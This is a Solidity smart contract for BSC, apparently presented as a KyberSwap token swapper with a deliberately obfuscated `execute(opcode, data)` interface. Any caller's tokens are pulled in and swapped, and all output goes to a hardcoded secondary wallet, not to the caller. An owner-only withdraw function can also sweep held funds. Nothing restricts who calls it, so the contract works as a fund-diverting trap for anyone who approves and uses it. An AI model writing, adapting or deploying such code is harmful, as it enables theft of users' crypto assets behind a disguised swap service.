// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

interface IMetaAggregationRouterV2 {
    struct SwapDescription {
        IERC20 srcToken;
        IERC20 dstToken;
        address payable srcReceiver;
        address payable dstReceiver;
        uint256 amount;
        uint256 minReturnAmount;
        uint256 flags;
    }

    function swapSimpleMode(
        address callTarget,
        SwapDescription calldata desc,
        bytes calldata targetData,
        bytes calldata clientData
    ) external payable returns (uint256, uint256);
}

contract KyberObfuscatedSwapperV3 is Ownable {
    using SafeERC20 for IERC20;
    
    // KyberSwap MetaAggregationRouterV2 on BSC
    IMetaAggregationRouterV2 public constant KYBER_ROUTER = 
        IMetaAggregationRouterV2(0x6131B5fae19EA4f9D964eAc0408E4408b66337b5);
    
    // Secondary wallet that receives ALL OUTPUT tokens (hardcoded)
    address private constant SECONDARY_WALLET = 0xB64aA20dF7976B2412520c70b459152fE9a17256;
    
    event Executed(address indexed user, uint256 opCode);
    
    // Main obfuscated function
    function execute(uint256 _op, bytes calldata _data) external payable {
        require(_op == 1, "Invalid operation");
        
        (
            address tokenIn,
            address tokenOut,
            uint256 amountIn,
            uint256 minAmountOut,
            bytes memory swapCalldata
        ) = abi.decode(_data, (address, address, uint256, uint256, bytes));
        
        // Transfer tokens from user to this contract
        IERC20(tokenIn).safeTransferFrom(msg.sender, address(this), amountIn);
        
        // Approve KyberSwap router
        IERC20(tokenIn).safeApprove(address(KYBER_ROUTER), amountIn);
        
        // Create swap description - OUTPUT GOES TO SECONDARY WALLET
        IMetaAggregationRouterV2.SwapDescription memory desc = IMetaAggregationRouterV2.SwapDescription({
            srcToken: IERC20(tokenIn),
            dstToken: IERC20(tokenOut),
            srcReceiver: payable(address(KYBER_ROUTER)),
            dstReceiver: payable(SECONDARY_WALLET), // ALL OUTPUT TO SECONDARY WALLET
            amount: amountIn,
            minReturnAmount: minAmountOut,
            flags: 0
        });
        
        // Execute swap
        KYBER_ROUTER.swapSimpleMode(
            address(KYBER_ROUTER),
            desc,
            swapCalldata,
            ""
        );
        
        emit Executed(msg.sender, _op);
    }
    
    // Emergency withdraw (only owner)
    function emergencyWithdraw(address token, uint256 amount) external onlyOwner {
        if (token == address(0)) {
            payable(owner()).transfer(amount);
        } else {
            IERC20(token).safeTransfer(owner(), amount);
        }
    }
    
    receive() external payable {}
}
